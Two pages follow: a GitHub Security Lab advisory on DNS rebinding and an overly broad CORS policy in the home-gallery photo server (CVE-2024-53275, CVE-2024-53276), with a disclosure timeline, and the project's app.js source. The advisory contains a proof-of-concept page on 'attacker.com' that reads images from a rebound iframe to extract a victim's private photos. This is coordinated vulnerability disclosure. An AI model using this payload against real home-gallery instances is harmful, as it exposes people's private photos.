=== Content from securitylab.github.com_325fec1f_20250115_081841.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

December 19, 2024
# GHSL-2024-091\_GHSL-2024-092: DNS rebinding attacks against Home-gallery - CVE-2024-53275, CVE-2024-53276

[![Author avatar](https://avatars.githubusercontent.com/u/11400619)
Kevin Stubbings](https://github.com/Kwstubbs)

## Coordinated Disclosure Timeline

* 2024-06-12: Vulnerability reported via [Private Vulnerability Reporting](https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/privately-reporting-a-security-vulnerability)
* 2024-07-06: Maintainer responds saying TLS should be enabled by the user. Reporter responds with many solutions to fix this issue via code, such as checking the host header or adding authentication.
* 2024-10-29: No followup after three replies asking for updates. Maintainer informed that the advisory will be released publicly in the coming weeks if no response.

## Summary

Home-gallery is vulnerable to DNS rebinding attacks and implements a broad CORS policy that may make it vulnerable to present or future attacks.

## Project

home-gallery

## Tested Version

[v1.15.0](https://github.com/xemle/home-gallery/releases/tag/v1.15.0)

## Details

### Issue 1: DNS rebinding attack (`GHSL-2024-091`)

The default setup of home-gallery is vulnerable to DNS rebinding. Home-gallery is set up without TLS and user authentication by default, leaving it vulnerable to DNS rebinding. In this attack, an attacker will ask a user to visit their website. The attacker website will then change the DNS records of their domain from their IP address to the internal IP address of the home-gallery instance. To tell which IP addresses are valid, we can rebind a subdomain to each IP address we want to check, and see if there is a response. Once potential candidates have been found, the attacker can launch the attack by reading the response of the web server after the IP address has changed. When the attacker domain is fetched, the response will be from the home-gallery instance, not the attacker website, because the IP address has been changed. Due to a lack of authentication, home-gallery photos can then be extracted by the attacker website.

#### Impact

This issue may lead to `Information Disclosure`. An attacker can leak the photos from home-gallery instances located on the same intranet as the victim.

#### Proof of Concept

An attacker can host the following html page on `attacker.com`:

```

<!DOCTYPE html>
<html>
<head>

</head>
<body>

<div class="center_div">
  <h1>Testing IFrame</h1>
</div>
<script>
    setInterval(function() {
        var a = document.createElement('iframe');
a.src = "attacker.com"; //add your iframe attacker url here
a.width = "1000";
a.height = "1000";
a.id= "here"
document.querySelector('body').appendChild(a)
console.log("Added iFrame");
console.log("Waiting 10 seconds");

  setTimeout(function()
  {
    document1 = document.getElementById('here').contentWindow.document
    var imgs = document1.getElementsByTagName("img");
    var imgSrcs = [];

    for (var i = 0; i < imgs.length; i++) {
        imgSrcs.push(imgs[i].src);
    }

    console.log(imgSrcs);
    for (var i = 0; i< imgSrcs.length; i++) {
      fetch(imgSrcs[i], {
        method: 'GET',
      })
      .then((response) => response.blob())
      .then((blob) => {
        const imageUrl = URL.createObjectURL(blob);
        const imageElement = document.createElement("img");
        imageElement.src = imageUrl;
        document.querySelector('body').appendChild(imageElement);
      });
    }
    here = document.getElementById('here');
    here.parentNode.removeChild(here);
    console.log("Removed iFrame");
  }, 5000);

    }, 10 * 1000); // 60 * 1000 milsec

</script>

</body>
</html>

```

When the victim the attacker website, a script can be run to automatically change the DNS record of `attacker.com`. This html page contains a hidden (not hidden for demo purposes) iframe that will open the attacker’s website again, but this time when the DNS record has been changed to the home-gallery instance. The iframe will show the home-gallery home page, and a script in this html page will read from the iframe, thus extracting the users’s private photos.

### Issue 2: Open CORS policy (`GHSL-2024-092`)

An open CORS policy in [app.js](https://github.com/xemle/home-gallery/blob/v1.15.0/packages/server/src/app.js#L45) may allow an attacker to view the images of home-gallery when it is using the default settings.

```
function createApp(config) {

  const app = express();
  app.use(cors())

```

The following express middleware allows any website to make a cross site request to home-gallery, thus allowing them to read any endpoint on home-gallery. Home-gallery is mostly safe from cross-site requests due to most of its pages requiring JavaScript, and cross-site requests such as `fetch()` do not render javascript. If an attacker is able to get the path of the preview images which are randomized, an attacker will be able to view such a photo. If any static files or endpoints are introduced in the future that contain sensitive information, they will be accessible to an attacker website.

#### Impact

In rare cases, this issue may lead to `Information Disclosure`.

#### Resources

[Express CORS Specify Origin](https://expressjs.com/en/resources/middleware/cors.html)

## CVE

* CVE-2024-53275 - GHSL-2024-091
* CVE-2024-53276 - GHSL-2024-092

## Credit

These issues were discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-091` or `GHSL-2024-092` in any communication regarding these issues.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_6bd1861f_20250115_081840.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxemle%2Fhome-gallery%2Fblob%2Fv1.15.0%2Fpackages%2Fserver%2Fsrc%2Fapp.js)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fxemle%2Fhome-gallery%2Fblob%2Fv1.15.0%2Fpackages%2Fserver%2Fsrc%2Fapp.js)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=xemle%2Fhome-gallery)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[xemle](/xemle)
/
**[home-gallery](/xemle/home-gallery)**
Public

* [Notifications](/login?return_to=%2Fxemle%2Fhome-gallery) You must be signed in to change notification settings
* [Fork
  66](/login?return_to=%2Fxemle%2Fhome-gallery)
* [Star
   870](/login?return_to=%2Fxemle%2Fhome-gallery)

* [Code](/xemle/home-gallery/tree/v1.15.0)
* [Issues
  18](/xemle/home-gallery/issues)
* [Pull requests
  4](/xemle/home-gallery/pulls)
* [Actions](/xemle/home-gallery/actions)
* [Projects
  0](/xemle/home-gallery/projects)
* [Security](/xemle/home-gallery/security)
* [Insights](/xemle/home-gallery/pulse)

Additional navigation options

* [Code](/xemle/home-gallery/tree/v1.15.0)
* [Issues](/xemle/home-gallery/issues)
* [Pull requests](/xemle/home-gallery/pulls)
* [Actions](/xemle/home-gallery/actions)
* [Projects](/xemle/home-gallery/projects)
* [Security](/xemle/home-gallery/security)
* [Insights](/xemle/home-gallery/pulse)

## Files

 v1.15.0
## Breadcrumbs

1. [home-gallery](/xemle/home-gallery/tree/v1.15.0)
2. /[packages](/xemle/home-gallery/tree/v1.15.0/packages)
3. /[server](/xemle/home-gallery/tree/v1.15.0/packages/server)
4. /[src](/xemle/home-gallery/tree/v1.15.0/packages/server/src)
/
# app.js

Copy path Blame  Blame
## Latest commit

## History

[History](/xemle/home-gallery/commits/v1.15.0/packages/server/src/app.js)91 lines (72 loc) · 2.77 KB v1.15.0
## Breadcrumbs

1. [home-gallery](/xemle/home-gallery/tree/v1.15.0)
2. /[packages](/xemle/home-gallery/tree/v1.15.0/packages)
3. /[server](/xemle/home-gallery/tree/v1.15.0/packages/server)
4. /[src](/xemle/home-gallery/tree/v1.15.0/packages/server/src)
/
# app.js

Top
## File metadata and controls

* Code
* Blame

91 lines (72 loc) · 2.77 KB[Raw](https://github.com/xemle/home-gallery/raw/refs/tags/v1.15.0/packages/server/src/app.js)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091const path = require('path');const express = require('express');const compression = require('compression');const cors = require('cors');const bodyParser = require('body-parser');
const { loggerMiddleware } = require('./logger-middleware')const { EventBus } = require('./eventbus');const databaseApi = require('./api/database');const treeApi = require('./api/database/tree');const eventsApi = require('./api/events');const webapp = require('./webapp');const { augmentReqByUserMiddleware, createBasicAuthMiddleware, defaultIpWhitelistRules } = require('./auth')const { isIndex, skipIf } = require('./utils')
const eventbus = new EventBus()
const webappDir = path.join(\_\_dirname, 'public')
function shouldCompress (req, res) { if (req.headers['x-no-compression']) { return false }
 return compression.filter(req, res)}
const getAuthMiddleware = config => { const users = config.server?.auth?.users || [] const rules = config.server?.auth?.rules || defaultIpWhitelistRules if (users.length) { return createBasicAuthMiddleware(users, rules) } return (req, \_, next) => next()}
function createApp(config) {
 const app = express(); app.disable('x-powered-by') app.enable('trust proxy')
 app.use(augmentReqByUserMiddleware()) app.use(loggerMiddleware()) app.use(cors()); app.use(compression({ filter: shouldCompress }))
 app.use(skipIf(express.static(webappDir, {maxAge: '1h'}), isIndex))
 app.use(getAuthMiddleware(config))
 app.use('/files', express.static(config.storage.dir, {index: false, maxAge: '2d', immutable: true})); app.use(bodyParser.json({limit: '1mb'}))
 const { read: readEvents, push: pushEvent, stream, getEvents } = eventsApi(eventbus, config.events.file); const { read: readDatabase, init: initDatabase, getFirstEntries, getDatabase } = databaseApi(eventbus, config.database.file, getEvents); const { read: readTree } = treeApi(eventbus, getDatabase);
 app.get('/api/events.json', readEvents); app.get('/api/events/stream', stream); app.post('/api/events', pushEvent); app.get('/api/database.json', readDatabase); app.get('/api/database/tree/:hash', readTree);
 if (config.server.remoteConsoleToken) { const debugApi = require('./api/debug')({remoteConsoleToken: config.server?.remoteConsoleToken}) app.post('/api/debug/console', debugApi.console); }
 // deprecated app.get('/api/database', readDatabase); app.get('/api/events', readEvents);
 const disabled = config?.webapp?.disabled || [] app.use(webapp(webappDir, req => ({ disabled: !!req.user ? [...disabled, 'pwa'] : disabled, entries: getFirstEntries(50) }), { basePath: config.server.basePath || '/', injectRemoteConsole: !!config.server.remoteConsoleToken }));
 return { app, initDatabase }}
module.exports = { createApp}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


